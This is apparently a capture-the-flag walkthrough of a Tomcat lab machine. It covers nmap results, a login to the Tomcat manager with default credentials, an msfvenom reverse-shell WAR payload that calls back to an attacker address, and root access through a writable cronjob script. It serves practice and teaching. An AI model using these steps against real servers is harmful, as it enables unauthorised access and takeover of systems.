After Opening the ip in the browser

So after a nmap scan we found 2 ports to  be opened that are

8080 & 8009

This is the exact nmap result

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat



After looking at the portal serving at port 8080 i got that there was a button leading us to a login page 

![img](https://miro.medium.com/v2/resize:fit:720/format:webp/1*BB3MDxsZvriXIdqt-ES_zQ.png)

After tapping on manager we are requested to login with id and passoword.

After a few tried i knew that it was default apache tomcat ID and Password

And soon i LOggedIN with ID = tomcat && Pass = s3cret

And here is our first look after logging in.

![Img](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ngmDbwloIIhItA4vEMe_8Q.png)

now as we scrool this page to the bottom we got a funciton to upload file and here comes the twist

We could now uplaod a payload here.

For this we are going to uplaod the payload with this command.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.64.42 LPORT=4444 -f war > shell.war
```

This generate us a payload named shell.war in the current directoy and we are going ot upload this to that functionality.

After uplaoding by tapping on Deploy we could see that new endpoint apprers on that page /manager page.

![img](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*rVjJ2gJcu-auGVp06WsYEg.png)

After it we will setup our lister and uploaid the payload is not enough we need to opne taht newly created endpoint in a new tab then only

It trigers function inside the paylaod.

When visted that endpoint i got the access to that shell then soon after it 

i got the shell into my listerner.

And After enumuration for a short period of time .


the user.txt was at usual location as all the thm flags lies that is

/home/jack/user.txt

And since now we are logged in into the shell as tomcat

We need to do privilage escation to get the root access and be able to read the second flag root.txt

And at the locaiton there was a file for our interest were 2 file 

1 was test.txt the content inside it was 

uid=0(root) gid=0(root) groups=0(root)

And there was a second file named id.sh

whose content was 

```bash
#!/bin/bash
id > test.txt
```

Now the id.sh is of our interest cuz it is set as cronjob 

```bash

*  *    * * *   root    cd /home/jack && bash id.sh


```

THis menas that 

Every minute, the system:

Switches to the directory /home/jack
Runs the script id.sh using Bash
Runs it with root privileges

Now we understood the workflow that id.sh will be executed as root and its content will be stored in the file test.txt every minute.

Also the file id.sh is writable from tomcat user we are now going to read the content of /root/root.txt with the file id.sh

And soon after we edit the file id.sh with this coneliner

```bash
echo -e '#!/bin/bash\ncat /root/root.txt > /home/jack/test.txt' > /home/jack/id.sh

```

And since it execute each min and write to test.txt

After a min i checked the file test.txt and got the root.txt flag
